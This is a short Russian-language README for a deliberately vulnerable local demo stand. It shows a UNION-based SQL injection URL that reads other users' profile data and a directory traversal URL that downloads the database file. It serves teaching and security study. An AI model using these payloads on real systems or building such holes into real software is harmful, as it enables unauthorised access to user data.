# Стенд для демонстрации уязвимостей
## Рассмотренные уязвимости
- SQL Injection
- Directory Traversal
## Запуск
```
pip install -r requirements.txt
python app.py
```
## Описание
После перехода на http://127.0.0.1:5000/ попадаем на страницу, на которой можно перейти в регистрация либо скачать public_data.txt. После регистрации происходит переход на профиль зарегистрированного пользователя

## Пример запроса для SQL Injection
Получить данные чужого профиля
```
http://127.0.0.1:5000/profile/' AND '1' = '2' UNION SELECT * FROM users; --
```
## Пример для Directory Traversal
Скачать файл базы данных
```
http://127.0.0.1:5000/download?file=..\/database.db
```